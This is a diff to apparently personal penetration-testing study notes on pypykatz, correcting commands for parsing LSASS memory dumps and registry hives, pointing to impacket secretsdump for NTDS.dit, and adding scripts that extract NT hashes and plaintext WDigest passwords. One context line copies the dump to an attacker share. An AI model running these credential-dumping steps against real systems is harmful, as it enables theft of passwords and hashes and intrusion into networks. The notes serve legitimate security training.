@@ -19,17 +19,21 @@ pypykatz lsa minidump lsass.dmp
 ## LSASS Minidump Parsing
 
 ```bash
-# Parse LSASS dump — all credentials
+# Parse LSASS dump — all credentials (default: text to stdout)
 pypykatz lsa minidump lsass.dmp
 
-# Output as JSON
-pypykatz lsa minidump lsass.dmp -o json > creds.json
+# Output as JSON (--json is a flag; -o/--outfile is the destination path)
+pypykatz lsa minidump lsass.dmp --json -o creds.json
+pypykatz lsa minidump lsass.dmp --json > creds.json      # or just redirect
 
-# Output as grep-friendly text
-pypykatz lsa minidump lsass.dmp -o text > creds.txt
+# Greppable, one-line-per-credential format
+pypykatz lsa minidump lsass.dmp -g
 
-# Verbose — show all packages including empty ones
-pypykatz lsa minidump lsass.dmp -v
+# Save default text output to a file
+pypykatz lsa minidump lsass.dmp -o creds.txt
+
+# Save recovered Kerberos tickets (.kirbi/.ccache) to a directory
+pypykatz lsa minidump lsass.dmp -k ./tickets/
 
 # Only show NThashes
 pypykatz lsa minidump lsass.dmp | grep -A5 "== MSV =="
@@ -66,26 +70,29 @@ logon_type: Interactive
 ## Registry Hive Parsing
 
 ```bash
-# Parse SAM + SYSTEM hives (local accounts)
-pypykatz registry --sam sam.save --system system.save
+# SYSTEM is a POSITIONAL argument (not --system); SAM/SECURITY/SOFTWARE are flags.
+# Parse SAM + SYSTEM hives (local account NT hashes)
+pypykatz registry --sam sam.save system.save
 
-# Parse SAM + SECURITY + SYSTEM (LSA secrets + cached creds)
-pypykatz registry --sam sam.save --security security.save --system system.save
+# Parse SAM + SECURITY + SYSTEM (adds LSA secrets + cached domain creds)
+pypykatz registry --sam sam.save --security security.save system.save
 
-# Output as JSON
-pypykatz registry --sam sam.save --system system.save -o json > hashes.json
+# Output as JSON to a file
+pypykatz registry --sam sam.save system.save --json -o hashes.json
 ```
 
 ---
 
-## NTDS.dit Parsing
+## NTDS.dit Parsing — use secretsdump, not pypykatz
+
+> [!warning] pypykatz has **no NTDS.dit parser.** Its subcommands are `lsa`, `registry`, `dpapi`, `kerberos`, `smb`, `live`, etc. — none read `ntds.dit`. For offline NTDS extraction use impacket's `secretsdump` (`LOCAL` mode), which is the standard tool.
 
 ```bash
-# Parse NTDS.dit + SYSTEM hive
-pypykatz dpapi system --ntds ntds.dit --system SYSTEM
-
-# Alternative — use secretsdump for NTDS parsing (more battle-tested)
+# Parse NTDS.dit + SYSTEM hive offline (impacket)
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+# See also DPAPI masterkey/blob decryption, which pypykatz DOES do:
+pypykatz dpapi masterkey ...   # (its dpapi subcommand — for DPAPI blobs, not NTDS)
 ```
 
 ---
@@ -131,7 +138,7 @@ copy C:\Windows\Temp\lsass.dmp \\KALI-IP\share\lsass.dmp
 
 ```bash
 # Extract all NT hashes from JSON output
-pypykatz lsa minidump lsass.dmp -o json | python3 -c "
+pypykatz lsa minidump lsass.dmp --json | python3 -c "
 import json, sys
 data = json.load(sys.stdin)
 seen = set()
@@ -146,7 +153,7 @@ for session in data.get('logon_sessions', {}).values():
 "
 
 # Extract WDigest plaintext passwords
-pypykatz lsa minidump lsass.dmp -o json | python3 -c "
+pypykatz lsa minidump lsass.dmp --json | python3 -c "
 import json, sys
 data = json.load(sys.stdin)
 for session in data.get('logon_sessions', {}).values():
@@ -168,10 +175,10 @@ for session in data.get('logon_sessions', {}).values():
 - Dump file contains raw credential material — handle carefully, encrypt at rest if storing
 
 
-> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] (CPTS v2).
+> [!note] **See also** — [[Tools/Credential Dumping/mimikatz|mimikatz]] (live/Windows counterpart that pypykatz reimplements); [[Tools/Credential Dumping/lsassy|lsassy]] (remote LSASS dump-and-parse — uses the pypykatz parser under the hood, so it's the "do it over the network" sibling); [[Tools/Credential Dumping/secretsdump|secretsdump]] (NTDS.dit + remote SAM/LSA — the tool for the NTDS job pypykatz can't do). Fits the credential-access / looting phase — [[Class notes/HTB Academy/CPTS v2 (claude)/Password Attacks|Password Attacks]] (CPTS v2).
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-07-31*
-*Model: claude-opus-5*
+*Updated: 2026-09-29*
+*Model: claude-opus-4-8*
